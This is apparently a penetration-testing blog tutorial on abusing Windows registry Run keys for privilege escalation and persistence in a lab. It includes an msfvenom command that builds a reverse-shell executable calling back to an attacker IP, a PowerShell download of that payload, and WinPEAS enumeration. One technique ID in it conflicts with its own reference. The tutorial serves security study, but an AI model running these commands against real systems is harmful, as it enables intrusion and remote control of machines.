<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Privilege Escalation: Logon Autostart Execution (Registry Run Keys)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-logon-autostart-execution-registry-run-keys/" rel="bookmark"><time class="entry-date published" datetime="2021-10-28T22:00:20+00:00">October 28, 2021</time><time class="updated" datetime="2025-05-10T20:28:09+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">If an attacker finds a service that has all permission and its bind with the Registry run key then he can perform privilege escalation or persistence attacks. When a legitimate user signs in, the service link with the registry will be executed automatically and this attack is known as <strong>Logon Autostart Execution due to Registry Run Keys.</strong></span></p>
<p><span style="color: #000000;">There are two techniques to perform Logon Autostart Execution :</span></p>
<ul>
<li><span style="color: #000000;"><strong>Logon Autostart Execution: Registry Run Keys</strong></span></li>
<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/">Logon Autostart Execution: Startup Folder</a></strong></span></li>
</ul>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<p><span style="color: #000000;"><strong>Run and RunOnce Registry Keys</strong></span></p>
<p><span style="color: #000000;"><strong>Boot | Logon Autostart Execution (Mitre Attack)</strong></span></p>
<p><span style="color: #000000;"><strong>Prerequisite</strong></span></p>
<p><span style="color: #000000;"><strong>Lab Setup</strong></span></p>
<p><span style="color: #000000;"><strong>Privilege Escalation by Abusing Registry Run Keys </strong></span></p>
<ul>
<li><span style="color: #000000;">Enumerating Assign Permissions using  WinPEAS</span></li>
<li><span style="color: #000000;">Creating Malicious Executable</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Run and RunOnce Registry Keys</strong></span></h3>
<p><span style="color: #000000;">Run and RunOnce registry keys cause programs to run each time a user logs on. The Run registry keys will run the task every time there’s a login. The RunOnce registry keys will run the tasks once and then delete that key. Then there is Run and RunOnce; the only difference is that RunOnce will automatically delete the entry upon successful execution.</span></p>
<p><span style="color: #000000;">The registry run keys perform the same action, but can be located in four different locations:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</pre>
<h3><span style="color: #800000;"><strong>Boot | Logon Autostart Execution: Registry Run Keys</strong></span></h3>
<p><span style="color: #000000;">Injecting a malicious program within a startup folder will also cause that program to execute when a user logs in, thus it may help an attacker to perform persistence or privilege escalation Attacks from misconfigured startup folder locations.</span></p>
<p><span style="color: #000000;">This technique is the most driven method for persistence used by well know APTs such as APT18, APT29,  APT37, etc.</span></p>
<p><span style="color: #000000;"><strong>Mitre ID:</strong> T1574.001</span></p>
<p><span style="color: #000000;"><strong>Tactics:</strong> Privilege Escalation &amp; Persistence</span></p>
<p><span style="color: #000000;"><strong>Platforms:</strong> Windows</span></p>
<h3><span style="color: #800000;"><strong>Prerequisite</strong></span></h3>
<p><span style="color: #000000;"><strong>Target Machine:</strong> Windows 10</span></p>
<p><span style="color: #000000;"><strong>Attacker Machine:</strong> Kali Linux</span></p>
<p><span style="color: #000000;"><strong>Tools: <a style="color: #000000;" href="https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md">Winpeas.exe</a></strong></span></p>
<p><span style="color: #000000;"><strong>Condition:</strong> Compromise the target machine with low privilege access either using Metasploit or Netcat, etc.</span></p>
<p><span style="color: #000000;"><strong>Objective:</strong> Escalate the NT Authority /SYSTEM privileges for a low privileged user by exploiting the Misconfigured Startup folder.</span></p>
<h3><span style="color: #800000;"><strong>Lab Setup</strong></span></h3>
<p><span style="color: #000000;">Note: Given steups will create a loophole through misconfigured startup folder, thus avoiding such configuration in a production environment.</span></p>
<p><span style="color: #000000;"><strong>Step1</strong>: create a new directory inside Program Files</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir C:\Program Files\Ignite Services</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh52PNAiCrfkGihzUYiLpop1oIxoQY3xvF74-zUQJfh1lhd40VN9GSl0ZnLvm4GioAG968GbloxQRLlxEj0exKi7NZepeBts1Lf4kD4QT5BHORydbOc9UktPG98IHnt7x0NeQ2LSVSNcyHFsNvYLok8hbmHt2A7jioZHMHxKVOThDywnfGpfFng3k_Lag=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Step 2:</strong>  Add an application or service or program to this directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhZ_Kiro0VvptmmtwZcQhWB6GqCTu5NdRRy8RjeOgdVdgQseeidBfgZYV-HGJwQZnweBIE56nr1KgIULefWyINdZ0-z1OV4g0CDrs9o21QAfbFGLo9Cm4qAOqyImzJTMSKgp_C5Vg17AAISqGlMJ7fT3N9_Go7t1z0pBLupUxtkffm9JzO8d4gYxWuqNw=s16000"/></span></p>
<p><span style="color: #000000;">Step3: Modify the permissions for the present directory by allowing Full Control for authenticated users.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiSbl9Fm5YpX-wCdBZ19owPfALIPpj338KaKCHjTY92GZBPPDTa0xh-F4cz6ZvxFhdIVap1NpVOq5QFN10HYVdRRzqD6GlCiAGJg_tdp-WrGKbrgc-i_-IC24AaTH9aP9bkn5adhxIMr4EtZ6D377eKC2upTbubRdwBvyGKi1lPsfu_uQZgGU484vhtMw=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Step 4:</strong> Open Run command prompt, type regedit.msc to edit registry key. Navigate to HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run and create new String Value “Services”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjf2dJm4EXIstaDfPXg2Kntej7sqsvLhtLd9pE5uTmmXijTg0niW1fh16LBd77EeV39QJG2lt3gWz4pruFTJcZ9eXcAPEyH6S60R_gZ-2Va6eozRqkYr_3h7VH9iTLmzeHuVEA1rtvvu6n1Nq0UJDlgfLdSE8WKJyBhJFrA4MkrzpakOuol-hdngcDU7g=s16000"/></span></p>
<p><span style="color: #000000;">Step 5: Give the path for the service you have created inside /program files/Ignite (Path for your service).</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgFbA1vWXdmKqb1rQWj2vqt0tHyDAxNjB4ZBWxmaOiB-uHFu4DAmGfzX2mAHsrME6bzmG73ZmXRLlkD60_uoWotM83zqFuPgXAkAlgwUK4Of1QNdE5AW37aqEUZnd4b3xOu4Nl6yl5T523qcSwwC3lh9_VW8yuGtluUBJL5rWt9E2x19ZYeVcvwNq5jnQ=s16000"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation by Abusing Registry Run Keys</strong></span></h3>
<p><span style="color: #000000;"><strong>Enumerating Assign Permissions with Winpeas</strong></span></p>
<p><span style="color: #000000;">Attackers can exploit these configuration locations to launch malware, such as RAT, in order to sustain persistence during system reboots.</span></p>
<p><span style="color: #000000;">Following an initial foothold, we can identify permissions using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">winPEASx64.exe quiet applicationinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEichoJ17_Gse4x4OAIeEpf6SO8QuAq6AzRGGeZ1r9NxPEsZsg7VoBH4cYuwQ8s2aX5ULUHhjvDhgMkGc7-1w771YKED3AjZK7KuVe-ZwIdAw8UfPVBOi-ehpOv_DWmt93PgHy4QGn4OwTASyCuzGN5fZRJksN2k2haoPFbmTZlaYuMJOOiyQQoyGgVuEQ=s16000"/></span></p>
<p><span style="color: #000000;">Here we enumerated ALL Permissions are assigned for Authenticated Users against “Ignite Services”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh4Vn-ehjIApoz7yjdt0W5dpvVueVxoQAtmyerScrOW3ZqVCdMRfENQnrwZwSb4PeNxSHNeeHEyKpCIfzf7-VyowXiJ2qUM9jp8cWw6RowQ7H09d9FYzioUsmrZflAg-7eyqnh6wPU-GBGerTpaIzhg6ifBt_VyPBwvqH52QxB0EY3JCFrqX5DnpAfe9g=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Creating Malicious Executable</strong></span></p>
<p><span style="color: #000000;">As we know the ALL users own read-write permission for the “Ignite Services” folder thus we can inject RAT to perform persistence or privilege escalation. Let’s create an executable program with the help of msfvenom.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom –p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe &gt; shell.exe
python –m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjSIOj9GKjsS5ws1BmDQwKqxixCGGI2B7c4lYcaOfivtTEX7_zACwJna2p12pZ6Y83CDzKDyX9JK-ioB9JjuQJIGka7erDWcC0MQv3jq6IuOesYZRSB_fMoYvSy9muiFs8wssrmKfwc5ErrzcwQ7nQEiqf6MbVX288SiHosLEZSuIrk962jMBmrLeSS4w=s16000"/></span></p>
<p><span style="color: #000000;">Before you replace original file.exe with malicious file to exe, rename original file.exe as file.bak</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiFDaXj-9QiZ_FtxwVi02Yaz_1cvKM0gjq1MKXTM6e6PflY9XSH1V8YgOnP4VzahEjgzP2GSK8IY0hjso6P9IK0p4rDBiyfMpy12bdXekoxwHrG62krBSDoon2Qc5x02ulBWYlCjehmpXc-3ycop0SSIIrimlJEO5G413Kx6IvENgdovNq3609M1mYi0g=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Executing Malicious Executable</strong></span></p>
<p><span style="color: #000000;">Start a netcat listener in a new terminal and transfer the file.exe with the help of the following command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget 192.168.1.3/shell.exe -o shell.exe
dir</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjWtP6zlvWAhDoE-ArjdbRV1co1R-_VCUGKYuxJQnaS6tn9BpWJ7yrtp0AZkFqkuVkPNUAx0QGxHdntswkST8GhJl5YAdn2MQN0erHlJClROjHBILe2s01reXqz8vyXDkPKlHooyIvj3-6mL2vFdezdtHXsQaTS_P_IWQML6QgPY51xGKDH0pBFL04zSQ=s16000"/></span></p>
<p><span style="color: #000000;">As we know this attack is named Boot Logon Autostart Execution which means the file.exe file operates when the system will reboot.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEir2STOGLqaMigvhfX95UGb-rS_et8FiDIPJ38y8l0lyhUAe3iWDHUlbwLCZ7J9uIcghvEl0YZ73VK9SJTVn3mE8JdjFaZ4XNqPZk1MEsZrZRRjLX4oA1Wk2t7vY71wURHkPfhct5tRDETivh7rhKHb9akf72w4ohCoIUg0X6hclnJqxj3qyKlu_-cMsA=s16000"/></span></p>
<p><span style="color: #000000;">The attacker will get a reverse connection in the new netcat session as NT Authority \System</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgovjOSQQOnjIVFEbc0bbDSrym1t6yFl93K0OmMbHr8PiGKAwVN92RNij3gset-MhIegDc4xDAm1pvfRE7LRJ_ecnE08jFkpTwf8xLUHmVR91ABgGlPEttczfzoHqPLKkbfBJCeAsum1_PWnfg-X2iXMlzFKiNtUy5NAXcplqYJea19Sqfc2qb_7vaPzA=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Reference</strong>:</span></p>
<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys">https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys</a></strong></span></p>
<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://attack.mitre.org/techniques/T1547/001/">https://attack.mitre.org/techniques/T1547/001/</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
